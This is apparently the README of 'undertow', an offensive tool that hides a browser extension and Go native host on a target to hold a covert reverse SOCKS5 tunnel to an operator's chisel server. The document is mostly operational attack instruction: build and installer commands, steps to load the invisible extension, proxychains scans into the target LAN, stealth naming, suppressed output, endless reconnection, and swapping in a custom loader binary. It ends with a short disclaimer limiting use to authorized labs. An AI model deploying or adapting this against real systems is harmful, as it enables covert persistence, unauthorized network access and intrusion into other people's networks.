# undertow

*It cost me 3.35$ to vibecode!*

An invisible browser extension + Go native messaging host that drags a
reverse SOCKS5 tunnel from a target back to your chisel server. The host
dials out once on browser launch, keeps the connection alive, and never
opens a port. Operator proxychains through the VPS and exits inside the
target LAN. Fire and forget.

```
 target (authorized lab box)                     your VPS
 ┌─────────────────────────────┐                ┌──────────────────────┐
 │ browser                      │                │ chisel server        │
 │  └─ extension (background)   │    outbound   │  :9999  (handshake) │
 │      └─ native host (go) ───────────────────────▶                     │
 │           dials VPS:9999     │   persistent  │  127.0.0.1:1080     │
 │           R:socks registered │    tunnel     │   (socks5 entry) ◀──┼── proxychains
 └─────────────────────────────┘                └──────────────────────┘
```

## How the tunnel works, end to end

1. **Browser starts.** The extension's MV3 service worker wakes and calls
   `runtime.connectNative("com.web.platform")`.
2. **Browser launches the host.** Native Messaging looks up the
   registered manifest, which points at a generated launcher
   (`start.sh` on Linux/macOS, `start.bat` on Windows). Browsers inject
   their own arguments into native hosts (extension origin, add-on id...)
   — the launcher drops all of that and runs the host with exactly the
   baked config:

   ```
   ./host <vps_host:port> [socks_port] [socks_bind]
   ```

   That argv convention is the whole host API. The Go binary is a thin
   shim: it dials, registers `R:<port>:socks` (default `R:socks`), and
   sits there. Swap in any binary that speaks the same argv and nothing
   else changes.
3. **Handshake.** The host connects out to `VPS:9999` (the *only* thing
   it ever dials) and registers its reverse SOCKS remote with the chisel
   server. This connection stays up for the life of the browser.
4. **Entry point appears.** The chisel server binds `127.0.0.1:1080`
   (default) on the VPS as the SOCKS5 entry. The operator never touches
   port 9999 — that's the tunnel trunk, not a proxy port.
5. **Traffic.** Operator proxychains to the VPS socks port → chisel
   bridges each SOCKS connection down the reverse tunnel → the host on
   the target makes the real connection inside the target LAN and pipes
   bytes back.
6. **No inbound anything.** No listener is ever opened on the target.
   All target-side traffic is a single outbound TCP stream.

## Layout

| file | what it is |
|---|---|
| `extension/manifest.json` | MV3 extension manifest template (key injected at build) |
| `extension/background.js` | service worker: launches host on browser startup, reconnects if it dies |
| `host/main.go` | the shim: parse argv, run chisel client, nothing else |
| `host/install.sh` | registers the native host on Linux/macOS |
| `host/install.ps1` | registers the native host on Windows (HKCU, no admin) |
| `build.sh` | master build script, outputs into `dist/` and zips |

## VPS setup

```bash
# install chisel
curl -sSL https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz \
  | gunzip > /usr/local/bin/chisel && chmod +x /usr/local/bin/chisel

# run server
chisel server --port 9999 --socks5 --reverse
```

`--reverse` is the flag that matters — it authorizes clients to register
reverse remotes (`R:socks`). `--socks5` is optional (it only enables
*forward* socks remotes through the server); keeping it changes nothing
for undertow. No auth is used by default — harden with
`--authfile` + `--auth user:pass` if you want (then build the host with
the creds baked into your custom binary).

## Build

Requirements on the operator box: `go`, `openssl`, `zip`.

```bash
./build.sh --vps 10.10.10.10:9999                              # linux/amd64, socks 1080
./build.sh --vps 10.10.10.10:9999 --target win --arch amd64    # windows exe
./build.sh --vps 10.10.10.10:9999 --target mac --arch arm64
./build.sh --vps 10.10.10.10:9999 --socks-port 1081            # per-target socks port
./build.sh --vps 10.10.10.10:9999 --socks-bind 0.0.0.0         # expose socks on the VPS
./build.sh --vps 10.10.10.10:9999 --custom-binary ./loader.exe # skip go build
```

| flag | meaning |
|---|---|
| `--target win\|lin\|mac` | target OS (default `lin`) |
| `--arch amd64\|arm64` | target arch (default `amd64`) |
| `--vps <host:port>` | chisel server address, baked into the launcher |
| `--socks-port <port>` | reverse SOCKS5 port on the VPS side (default `1080`), baked into the launcher |
| `--socks-bind <host>` | interface chisel binds the socks listener to on the VPS (default `127.0.0.1`) |
| `--custom-binary <path>` | package this binary as `host` instead of compiling the Go shim |
| `--rotate-key` | generate a fresh extension ID instead of reusing `.ext-key.pem` |

The build derives the Chrome extension ID from an RSA keypair stored in
`.ext-key.pem` — generated on first run and **reused after that**, so
rebuilding doesn't invalidate an extension you've already loaded
unpacked (the ID would change and the native host would reject it with
*Access to the specified native messaging host is forbidden*). Use
`--rotate-key` when you want a distinct identity per engagement. The
`key` field pins the ID of an unpacked extension, and
`allowed_origins`/`allowed_extensions` get baked into the native
messaging manifest. Result: the zip is fully self-consistent, no manual
ID editing anywhere.

Output: `dist/undertow-<target>-<arch>/` plus
`dist/undertow-<target>-<arch>.zip`, containing:

```
host                    the binary (host.exe on windows)
start.sh|bat            launcher with baked config, browser argv junk gets dropped
com.web.platform.json   native messaging manifest (path finalized by the installer)
install.sh|ps1          target-side installer
extension/              the extension to load in the browser
```

## Deploy on target

Drop the zip, unzip, run the installer for the platform:

```bash
unzip undertow-lin-amd64.zip -d ut && cd undertow-lin-amd64 && ./install.sh
```

```powershell
Expand-Archive undertow-win-amd64.zip; cd undertow-win-amd64; .\install.ps1
```

The installer copies everything to a stable path
(`~/.local/share/webplatform` / `%LOCALAPPDATA%\WebPlatform`), finalizes
the launcher and manifest, and registers the host for Chrome, Chromium,
Brave, Edge and Firefox (per-user: no root, no admin).

Then load the extension:

- **Chrome/Chromium/Brave/Edge:** `chrome://extensions` → enable
  *Developer mode* → *Load unpacked* → select the **`extension/` folder
  itself** (inside the install dir or the dist payload — never the
  payload root, which holds the native host bits, not the extension).
  It appears as *Web Platform Helper*, no icon, no popup, no visible
  surface.
- **Firefox:** `about:debugging` → *This Firefox* → *Load Temporary
  Add-on* → pick `extension/manifest.json` from the install dir.

The moment the extension's background worker starts, the host launches
and the tunnel comes up.

## Using the tunnel

chisel binds the SOCKS5 entry on the VPS loopback by default. Two clean
ways to reach it:

```bash
# option A — port-forward it to your box (recommended, socks stays loopback on the VPS)
ssh -N -L 1080:127.0.0.1:1080 operator@vps
```

```bash
# option B — build with --socks-bind 0.0.0.0 and reach the VPS directly
# (firewall it to your IP: this is an unauthenticated proxy if you don't)
```

proxychains config:

```
[ProxyList]
socks5 127.0.0.1 1080     # option A
# socks5 VPS_IP 1080       # option B
```

```bash
proxychains nmap -sT -Pn 172.16.0.0/24
proxychains curl http://10.10.10.5:8080/
```

## Multi-target

One chisel server can hold many clients — just give each target its own
socks port so the listeners don't collide:

```bash
./build.sh --vps vps:9999 --socks-port 1080 --target win
./build.sh --vps vps:9999 --socks-port 1081 --target lin
./build.sh --vps vps:9999 --socks-port 1082 --target mac
```

proxychains to `VPS:1080`, `:1081`, `:1082` — each exits inside its own
target. Alternatively run one chisel server instance per target
(different `--port`) and keep socks on 1080 everywhere.

## Custom binary

The Go shim is deliberately replaceable. Anything that accepts

```
./host <vps_host:port> [socks_port] [socks_bind]
```

can be dropped in, e.g. a sk4r4b PE loader that embeds the chisel
client and its config, reads argv[1] as the server address, and speaks
chisel client underneath:

```bash
./build.sh --vps vps:9999 --target win --custom-binary ./sk4r4b_loader.exe
```

`build.sh` skips the Go toolchain entirely and packages your binary as
`host.exe` behind the same launcher, same manifest, same extension.
Your loader gets launched with the identical argv the shim would, minus
any junk the browser tries to pass. Optional argv[2]/argv[3] (socks
port, bind) are yours to honor or ignore — the defaults are 1080 and
127.0.0.1.

## Reconnection behavior

Two independent layers:

- **Network drop:** the chisel client inside the host retries forever
  (`MaxRetryCount: -1`, exponential backoff 1s→5m capped). The process
  stays up through server reboots, Wi-Fi flaps, DNS blips.
- **Host death:** if the process actually dies, the browser fires the
  port's `onDisconnect`, and the extension relaunches it after 5s. If
  the service worker itself was killed, a 1-minute alarm wakes it and
  it reconnects on wake. Browser restart: `onStartup` → relaunch.

The tunnel lives as long as the browser does — close the browser and
the host is torn down with it; open it again and the tunnel is back
within seconds. That's inherent to extension-driven persistence and
also its stealth advantage: no autostart entry, no scheduled task, no
new service — the persistence *is* the browser.

## Operational notes

- Extension is fully invisible: no `action`, no icon, no popup, no
  content scripts, no visible surface — only a boring
  *Web Platform Helper* line in the extensions page. Everything is
  named boring on purpose (`com.web.platform`, `WebPlatform` dirs) —
  rename before an engagement if you care.
- The host never touches stdout (native messaging protocol channel) and
  its chisel logging is discarded — zero output, zero console windows
  (`-H windowsgui` on the PE). stdin is drained and ignored.
- MV3 lifetime: since Chrome 105 an open native port keeps the service
  worker alive, so the extension is effectively resident while the
  browser runs. Firefox needs 121+ for the MV3 service worker.
- Browsers kill the host when the extension port closes — that's the
  designed shutdown path, not a failure.

## Legal

For authorized engagements and lab targets only. Covert browser
extension persistence plus an outbound tunnel on a machine you don't own
is a felony-shaped object in most jurisdictions. Keep it in the lab.
